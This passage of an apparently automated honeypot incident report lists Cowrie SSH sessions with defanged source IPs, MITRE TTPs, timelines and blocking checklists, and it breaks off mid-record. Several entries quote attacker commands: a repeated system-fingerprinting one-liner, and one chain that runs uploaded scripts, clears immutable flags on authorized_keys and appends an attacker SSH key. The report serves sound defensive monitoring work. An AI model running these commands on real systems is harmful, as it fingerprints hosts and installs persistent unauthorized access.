| `2026-09-05 11:45:54` | `cowrie.command.input` |
| `2026-09-05 11:45:54` | `cowrie.command.input` |
| `2026-09-05 11:45:54` | `cowrie.command.input` |
| `2026-09-05 11:45:54` | `cowrie.command.input` |
| `2026-09-05 11:45:55` | `cowrie.log.closed` |
| `2026-09-05 11:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3904c3b56cb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:47 |
| **Last Seen** | 2026-09-05 11:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:47:48` | `cowrie.session.connect` |
| `2026-09-05 11:47:49` | `cowrie.client.version` |
| `2026-09-05 11:47:49` | `cowrie.client.kex` |
| `2026-09-05 11:47:50` | `cowrie.login.success` |
| `2026-09-05 11:47:51` | `cowrie.session.params` |
| `2026-09-05 11:47:51` | `cowrie.command.input` |
| `2026-09-05 11:47:51` | `cowrie.command.input` |
| `2026-09-05 11:47:51` | `cowrie.command.input` |
| `2026-09-05 11:47:51` | `cowrie.command.input` |
| `2026-09-05 11:47:51` | `cowrie.command.input` |
| `2026-09-05 11:47:51` | `cowrie.command.success` |
| `2026-09-05 11:47:51` | `cowrie.command.input` |
| `2026-09-05 11:47:51` | `cowrie.command.input` |
| `2026-09-05 11:47:51` | `cowrie.command.input` |
| `2026-09-05 11:47:51` | `cowrie.command.input` |
| `2026-09-05 11:47:52` | `cowrie.log.closed` |
| `2026-09-05 11:47:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e30ae222c640

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:50 |
| **Last Seen** | 2026-09-05 11:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:50:02` | `cowrie.session.connect` |
| `2026-09-05 11:50:02` | `cowrie.client.version` |
| `2026-09-05 11:50:02` | `cowrie.client.kex` |
| `2026-09-05 11:50:02` | `cowrie.login.success` |
| `2026-09-05 11:50:03` | `cowrie.session.params` |
| `2026-09-05 11:50:03` | `cowrie.command.input` |
| `2026-09-05 11:50:03` | `cowrie.command.input` |
| `2026-09-05 11:50:03` | `cowrie.command.input` |
| `2026-09-05 11:50:03` | `cowrie.command.input` |
| `2026-09-05 11:50:03` | `cowrie.command.input` |
| `2026-09-05 11:50:03` | `cowrie.command.success` |
| `2026-09-05 11:50:03` | `cowrie.command.input` |
| `2026-09-05 11:50:03` | `cowrie.command.input` |
| `2026-09-05 11:50:03` | `cowrie.command.input` |
| `2026-09-05 11:50:03` | `cowrie.command.input` |
| `2026-09-05 11:50:04` | `cowrie.log.closed` |
| `2026-09-05 11:50:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b26fb3efbf0a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-05 11:53 |
| **Last Seen** | 2026-09-05 11:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:53:14` | `cowrie.session.connect` |
| `2026-09-05 11:53:14` | `cowrie.client.version` |
| `2026-09-05 11:53:14` | `cowrie.client.kex` |
| `2026-09-05 11:53:15` | `cowrie.login.success` |
| `2026-09-05 11:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d69a06e0b13

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-05 11:53 |
| **Last Seen** | 2026-09-05 11:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:53:15` | `cowrie.session.connect` |
| `2026-09-05 11:53:15` | `cowrie.client.version` |
| `2026-09-05 11:53:15` | `cowrie.client.kex` |
| `2026-09-05 11:53:16` | `cowrie.login.success` |
| `2026-09-05 11:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd9a11de2b27

| Field | Detail |
|---|---|
| **Source IP** | `209.99.186[.]128` |
| **First Seen** | 2026-09-05 11:58 |
| **Last Seen** | 2026-09-05 12:00 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:58:16` | `cowrie.session.connect` |
| `2026-09-05 11:58:17` | `cowrie.login.success` |
| `2026-09-05 11:58:18` | `cowrie.session.params` |
| `2026-09-05 11:58:18` | `cowrie.command.input` |
| `2026-09-05 11:58:18` | `cowrie.command.input` |
| `2026-09-05 11:58:19` | `cowrie.command.input` |
| `2026-09-05 11:58:20` | `cowrie.command.input` |
| `2026-09-05 11:58:20` | `cowrie.command.failed` |
| `2026-09-05 12:00:23` | `cowrie.log.closed` |
| `2026-09-05 12:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.186[.]128` to AbuseIPDB if not already reported
- [ ] Block `209.99.186[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98bfb86ccf12

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-09-05 12:02 |
| **Last Seen** | 2026-09-05 12:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:02:57` | `cowrie.session.connect` |
| `2026-09-05 12:02:58` | `cowrie.client.version` |
| `2026-09-05 12:02:58` | `cowrie.client.kex` |
| `2026-09-05 12:03:04` | `cowrie.login.success` |
| `2026-09-05 12:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d76b90b23b6d

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-09-05 12:03 |
| **Last Seen** | 2026-09-05 12:03 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:03:07` | `cowrie.session.connect` |
| `2026-09-05 12:03:07` | `cowrie.client.version` |
| `2026-09-05 12:03:07` | `cowrie.client.kex` |
| `2026-09-05 12:03:08` | `cowrie.login.success` |
| `2026-09-05 12:03:41` | `cowrie.session.params` |
| `2026-09-05 12:03:41` | `cowrie.command.input` |
| `2026-09-05 12:03:41` | `cowrie.log.closed` |
| `2026-09-05 12:03:41` | `cowrie.session.file_upload` |
| `2026-09-05 12:03:41` | `cowrie.session.file_upload` |
| `2026-09-05 12:03:41` | `cowrie.session.file_upload` |
| `2026-09-05 12:03:41` | `cowrie.session.file_upload` |
| `2026-09-05 12:03:41` | `cowrie.session.file_upload` |
| `2026-09-05 12:03:41` | `cowrie.session.file_upload` |
| `2026-09-05 12:03:41` | `cowrie.session.file_upload` |
| `2026-09-05 12:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dce3e33c08ab

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-05 12:11 |
| **Last Seen** | 2026-09-05 12:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:11:28` | `cowrie.session.connect` |
| `2026-09-05 12:11:28` | `cowrie.client.version` |
| `2026-09-05 12:11:28` | `cowrie.client.kex` |
| `2026-09-05 12:11:32` | `cowrie.login.success` |
| `2026-09-05 12:11:34` | `cowrie.session.params` |
| `2026-09-05 12:11:34` | `cowrie.command.input` |
| `2026-09-05 12:11:34` | `cowrie.command.input` |
| `2026-09-05 12:11:34` | `cowrie.command.input` |
| `2026-09-05 12:11:34` | `cowrie.command.input` |
| `2026-09-05 12:11:34` | `cowrie.command.input` |
| `2026-09-05 12:11:34` | `cowrie.command.success` |
| `2026-09-05 12:11:34` | `cowrie.command.input` |
| `2026-09-05 12:11:34` | `cowrie.command.input` |
| `2026-09-05 12:11:34` | `cowrie.command.input` |
| `2026-09-05 12:11:34` | `cowrie.command.input` |
| `2026-09-05 12:11:34` | `cowrie.log.closed` |
| `2026-09-05 12:11:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b761f94f18f9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-05 12:13 |
| **Last Seen** | 2026-09-05 12:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:13:34` | `cowrie.session.connect` |
| `2026-09-05 12:13:34` | `cowrie.client.version` |
| `2026-09-05 12:13:34` | `cowrie.client.kex` |
| `2026-09-05 12:13:37` | `cowrie.login.success` |
| `2026-09-05 12:13:39` | `cowrie.session.params` |
| `2026-09-05 12:13:39` | `cowrie.command.input` |
| `2026-09-05 12:13:39` | `cowrie.command.input` |
| `2026-09-05 12:13:39` | `cowrie.command.input` |
| `2026-09-05 12:13:39` | `cowrie.command.input` |
| `2026-09-05 12:13:39` | `cowrie.command.input` |
| `2026-09-05 12:13:39` | `cowrie.command.success` |
| `2026-09-05 12:13:39` | `cowrie.command.input` |
| `2026-09-05 12:13:39` | `cowrie.command.input` |
| `2026-09-05 12:13:39` | `cowrie.command.input` |
| `2026-09-05 12:13:39` | `cowrie.command.input` |
| `2026-09-05 12:13:39` | `cowrie.log.closed` |
| `2026-09-05 12:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e39912f20a8d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-05 12:15 |
| **Last Seen** | 2026-09-05 12:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:15:35` | `cowrie.session.connect` |
| `2026-09-05 12:15:36` | `cowrie.client.version` |
| `2026-09-05 12:15:36` | `cowrie.client.kex` |
| `2026-09-05 12:15:39` | `cowrie.login.success` |
| `2026-09-05 12:15:41` | `cowrie.session.params` |
| `2026-09-05 12:15:41` | `cowrie.command.input` |
| `2026-09-05 12:15:41` | `cowrie.command.input` |
| `2026-09-05 12:15:41` | `cowrie.command.input` |
| `2026-09-05 12:15:41` | `cowrie.command.input` |
| `2026-09-05 12:15:41` | `cowrie.command.input` |
| `2026-09-05 12:15:41` | `cowrie.command.success` |
| `2026-09-05 12:15:41` | `cowrie.command.input` |
| `2026-09-05 12:15:41` | `cowrie.command.input` |
| `2026-09-05 12:15:41` | `cowrie.command.input` |
| `2026-09-05 12:15:41` | `cowrie.command.input` |
| `2026-09-05 12:15:41` | `cowrie.log.closed` |
| `2026-09-05 12:15:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b66dd2f18bb7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-05 12:17 |
| **Last Seen** | 2026-09-05 12:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:17:36` | `cowrie.session.connect` |
| `2026-09-05 12:17:36` | `cowrie.client.version` |
| `2026-09-05 12:17:36` | `cowrie.client.kex` |
| `2026-09-05 12:17:40` | `cowrie.login.success` |
| `2026-09-05 12:17:42` | `cowrie.session.params` |
| `2026-09-05 12:17:42` | `cowrie.command.input` |
| `2026-09-05 12:17:42` | `cowrie.command.input` |
| `2026-09-05 12:17:42` | `cowrie.command.input` |
| `2026-09-05 12:17:42` | `cowrie.command.input` |
| `2026-09-05 12:17:42` | `cowrie.command.input` |
| `2026-09-05 12:17:42` | `cowrie.command.success` |
| `2026-09-05 12:17:42` | `cowrie.command.input` |
| `2026-09-05 12:17:42` | `cowrie.command.input` |
| `2026-09-05 12:17:42` | `cowrie.command.input` |
| `2026-09-05 12:17:42` | `cowrie.command.input` |
| `2026-09-05 12:17:43` | `cowrie.log.closed` |
| `2026-09-05 12:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-061d85212e7b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 12:20 |
| **Last Seen** | 2026-09-05 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:20:12` | `cowrie.session.connect` |
| `2026-09-05 12:20:12` | `cowrie.client.version` |
| `2026-09-05 12:20:12` | `cowrie.client.kex` |
| `2026-09-05 12:20:13` | `cowrie.login.success` |
| `2026-09-05 12:20:13` | `cowrie.direct-tcpip.request` |
| `2026-09-05 12:20:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 12:20:13` | `cowrie.direct-tcpip.data` |
| `2026-09-05 12:20:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-325a18d86430

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-05 12:21 |
| **Last Seen** | 2026-09-05 12:22 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:21:54` | `cowrie.session.connect` |
| `2026-09-05 12:21:55` | `cowrie.client.version` |
| `2026-09-05 12:21:55` | `cowrie.client.kex` |
| `2026-09-05 12:22:00` | `cowrie.login.success` |
| `2026-09-05 12:22:03` | `cowrie.session.params` |
| `2026-09-05 12:22:03` | `cowrie.command.input` |
| `2026-09-05 12:22:03` | `cowrie.command.input` |
| `2026-09-05 12:22:03` | `cowrie.command.input` |
| `2026-09-05 12:22:03` | `cowrie.command.input` |
| `2026-09-05 12:22:03` | `cowrie.command.input` |
| `2026-09-05 12:22:03` | `cowrie.command.success` |
| `2026-09-05 12:22:03` | `cowrie.command.input` |
| `2026-09-05 12:22:03` | `cowrie.command.input` |
| `2026-09-05 12:22:03` | `cowrie.command.input` |
| `2026-09-05 12:22:03` | `cowrie.command.input` |
| `2026-09-05 12:22:05` | `cowrie.log.closed` |
| `2026-09-05 12:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4224ca1f3050

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-05 12:24 |
| **Last Seen** | 2026-09-05 12:24 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:24:04` | `cowrie.session.connect` |
| `2026-09-05 12:24:06` | `cowrie.client.version` |
| `2026-09-05 12:24:06` | `cowrie.client.kex` |
| `2026-09-05 12:24:13` | `cowrie.login.success` |
| `2026-09-05 12:24:18` | `cowrie.session.params` |
| `2026-09-05 12:24:18` | `cowrie.command.input` |
| `2026-09-05 12:24:18` | `cowrie.command.input` |
| `2026-09-05 12:24:18` | `cowrie.command.input` |
| `2026-09-05 12:24:18` | `cowrie.command.input` |
| `2026-09-05 12:24:18` | `cowrie.command.input` |
| `2026-09-05 12:24:18` | `cowrie.command.success` |
| `2026-09-05 12:24:18` | `cowrie.command.input` |
| `2026-09-05 12:24:18` | `cowrie.command.input` |
| `2026-09-05 12:24:18` | `cowrie.command.input` |
| `2026-09-05 12:24:18` | `cowrie.command.input` |
| `2026-09-05 12:24:20` | `cowrie.log.closed` |
| `2026-09-05 12:24:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e06772b6b5a4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-05 12:26 |
| **Last Seen** | 2026-09-05 12:26 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 12:26:11` | `cowrie.session.connect` |
| `2026-09-05 12:26:14` | `cowrie.client.version` |
| `2026-09-05 12:26:14` | `cowrie.client.kex` |
| `2026-09-05 12:26:26` | `cowrie.login.success` |
| `2026-09-05 12:26:32` | `cowrie.session.params` |
| `2026-09-05 12:26:32` | `cowrie.command.input` |
| `2026-09-05 12:26:32` | `cowrie.command.input` |
| `2026-09-05 12:26:32` | `cowrie.command.input` |
